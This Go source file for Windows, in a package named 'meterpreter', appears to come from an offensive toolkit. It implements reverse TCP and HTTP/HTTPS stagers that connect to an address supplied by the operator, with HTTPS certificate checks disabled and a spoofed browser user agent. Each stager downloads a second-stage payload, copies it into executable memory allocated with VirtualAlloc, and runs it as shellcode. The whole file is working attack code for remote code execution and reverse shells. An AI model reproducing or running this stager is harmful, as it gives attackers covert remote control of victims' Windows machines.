//go:build windows
// +build windows

package meterpreter

import (
	"crypto/tls"
	"encoding/binary"
	"errors"
	"io/ioutil"
	"net"
	"net/http"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
)

// Start creates a new meterpreter connection with the given transport type
func Meterpreter(transport, address string) error {
	switch transport {
	case "tcp":
		return ReverseTCP(address)
	case "http", "https":
		return ReverseHTTP(transport, address)
	default:
		return errors.New("unsupported transport type")
	}
}

// ReverseHTTP initiates a new reverse HTTP/HTTPS meterpreter connection
func ReverseHTTP(connType, address string) error {
	url := connType + "://" + address + "/" + generateUUID()
	client := &http.Client{}
	if connType == "https" {
		transport := &http.Transport{
			DisableKeepAlives: true,
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
			DialContext: (&net.Dialer{
				Timeout: 3 * time.Second,
			}).DialContext,
			TLSHandshakeTimeout: 10 * time.Second,
		}
		client = &http.Client{Transport: transport}
	}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko")
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	stage2buf, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	if len(stage2buf) < 100 {
		return errors.New("meterpreter error: could not receive second stage")
	}
	return ExecShellcode(stage2buf)
}

// ReverseTCP initiates a new reverse TCP meterpreter connection
func ReverseTCP(address string) error {

	kernel32 := syscall.MustLoadDLL("kernel32.dll") //kernel32.dll
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")

	var WSAData syscall.WSAData
	syscall.WSAStartup(uint32(0x202), &WSAData)
	socket, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)

	IPnPort := strings.Split(address, ":")
	IPOctet := strings.Split(IPnPort[0], ".")
	var IPOctetIntArr [4]int
	for i := 0; i < 4; i++ {
		IPOctetIntArr[i], _ = strconv.Atoi(IPOctet[i])
	}

	portInt, _ := strconv.Atoi(IPnPort[1])
	sockaddrInet4 := syscall.SockaddrInet4{Port: portInt, Addr: [4]byte{byte(IPOctetIntArr[0]), byte(IPOctetIntArr[1]), byte(IPOctetIntArr[2]), byte(IPOctetIntArr[3])}}
	syscall.Connect(socket, &sockaddrInet4)
	var secondStageLengt [4]byte
	WSABuffer := syscall.WSABuf{Len: uint32(4), Buf: &secondStageLengt[0]}
	flags := uint32(0)
	dataReceived := uint32(0)
	syscall.WSARecv(socket, &WSABuffer, 1, &dataReceived, &flags, nil, nil)
	secondStageLengthInt := binary.LittleEndian.Uint32(secondStageLengt[:])

	if secondStageLengthInt < 100 {
		return errors.New("socket failed receiving second stage")
	}

	secondStageBuffer := make([]byte, secondStageLengthInt)
	var shellcode []byte
	WSABuffer = syscall.WSABuf{Len: secondStageLengthInt, Buf: &secondStageBuffer[0]}
	flags = uint32(0)
	dataReceived = uint32(0)
	totalDataReceived := uint32(0)
	for totalDataReceived < secondStageLengthInt {
		syscall.WSARecv(socket, &WSABuffer, 1, &dataReceived, &flags, nil, nil)
		for i := 0; i < int(dataReceived); i++ {
			shellcode = append(shellcode, secondStageBuffer[i])
		}
		totalDataReceived += dataReceived
	}
	addr, _, _ := VirtualAlloc.Call(0, uintptr(secondStageLengthInt+5), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	addrPtr := (*[990000]byte)(unsafe.Pointer(addr))
	socketPtr := (uintptr)(unsafe.Pointer(socket))
	addrPtr[0] = 0xBF
	addrPtr[1] = byte(socketPtr)
	addrPtr[2] = 0x00
	addrPtr[3] = 0x00
	addrPtr[4] = 0x00
	for i, j := range shellcode {
		addrPtr[i+5] = j
	}
	go syscall.SyscallN(addr, 0, 0, 0, 0)
	return nil
}

// ExecShellcode executes the given shellcode
func ExecShellcode(shellcode []byte) error {
	// Resolve kernell32.dll, and VirtualAlloc
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	// Reserve space to drop shellcode
	address, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x2000|0x1000, 0x40)
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			return err
		}
	}
	// Ugly, but works
	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
	// Copy shellcode
	for i, value := range shellcode {
		addrPtr[i] = value
	}
	go syscall.SyscallN(address, 0, 0, 0, 0)
	return nil
}

// NewURI generates a new meterpreter connection URI witch is a random string with a special 8bit checksum
//func NewURI(length int) string {
//
//	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
//	var seed *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
//	buf := make([]byte, length)
//	for i := range buf {
//		buf[i] = charset[seed.Intn(len(charset))]
//	}
//
//	checksum := 0
//	for _, value := range string(buf) {
//		checksum += int(value)
//	}
//	if (checksum % 0x100) == 92 {
//		return string(buf)
//	}
//	return NewURI(length)
//}
